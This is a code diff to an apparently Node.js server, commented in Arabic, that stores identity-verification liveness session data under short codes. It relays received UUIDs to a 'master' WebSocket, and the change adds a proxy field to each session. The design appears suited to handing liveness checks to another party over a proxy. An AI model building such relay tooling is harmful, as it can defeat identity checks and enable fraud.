@@ -51,7 +51,7 @@ app.post('/create-short-link', (req, res) => {
         return res.status(400).json({ error: "No session data provided" });
     }
 
-    // 🔥 التعديل هنا: استخراج الروابط الجديدة صراحة لضمان حفظها بشكل صحيح وآمن
+    // 🔥 استخراج الروابط وبيانات البروكسي لحفظها في الجلسة
     const newSession = {
         user_id: sessionData.user_id,
         transaction_id: sessionData.transaction_id,
@@ -59,8 +59,9 @@ app.post('/create-short-link', (req, res) => {
         plugin_liveness_url: sessionData.plugin_liveness_url,
         challenge_url: sessionData.challenge_url,
         check_id: sessionData.check_id,
-        config_url: sessionData.config_url || null, // الرابط الأول (config.php)
-        init_url: sessionData.init_url || null      // الرابط الثاني (init.php)
+        config_url: sessionData.config_url || null, 
+        init_url: sessionData.init_url || null,
+        proxy: sessionData.proxy || null // 🔴 تمت إضافة حقل البروكسي هنا
     };
 
     // توليد كود عشوائي من 6 أحرف وأرقام
@@ -68,7 +69,7 @@ app.post('/create-short-link', (req, res) => {
     
     // حفظ البيانات في السيرفر وربطها بالكود
     shortSessions.set(shortCode, newSession);
-    console.log(`[SESSION CREATED] Short Code: ${shortCode} | Includes OZ URLs: ${!!newSession.config_url}`);
+    console.log(`[SESSION CREATED] Short Code: ${shortCode} | Proxy Attached: ${!!newSession.proxy}`);
 
     // تنظيف الذاكرة: حذف الجلسة تلقائياً بعد 15 دقيقة
     setTimeout(() => {
@@ -101,7 +102,7 @@ app.post('/', (req, res) => {
         return res.status(400).json({ success: false, error: 'Missing session_id' });
     }
 
-    // البحث عن الماستر المرتبط بهذه الجلسة (session_id هو الكود القصير)
+    // البحث عن الماستر المرتبط بهذه الجلسة
     const masterWs = activeMasters.get(session_id);
     const isMasterConnected = masterWs && masterWs.readyState === WebSocket.OPEN;
 
@@ -120,7 +121,7 @@ app.post('/', (req, res) => {
                 }));
             }
             console.log(`[SUCCESS] UUID received and forwarded for session: ${session_id}`);
-            return res.json({ success: true }); // الرد على العميل بالنجاح
+            return res.json({ success: true }); 
         } catch (err) {
             console.error('Payload decoding error:', err);
             return res.status(500).json({ success: false, error: 'Invalid payload formatting' });
